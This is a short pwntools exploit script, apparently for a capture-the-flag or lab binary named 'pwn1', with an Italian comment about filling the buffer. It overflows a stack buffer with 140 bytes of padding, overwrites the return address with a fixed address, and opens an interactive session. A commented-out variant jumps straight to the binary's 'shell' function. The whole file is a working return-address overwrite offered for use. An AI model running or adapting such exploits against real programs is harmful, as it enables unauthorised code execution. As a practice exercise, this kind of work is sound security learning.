#riempio buffer di 14
from pwn import *

context.binary = "./pwn1"

p = process()
p.sendline(b"A"*140+p32(0x080484ad))
p.interactive()







#p.sendline(b"A" * 128 + b"a" * 12 + p32(context.binary.functions["shell"].address))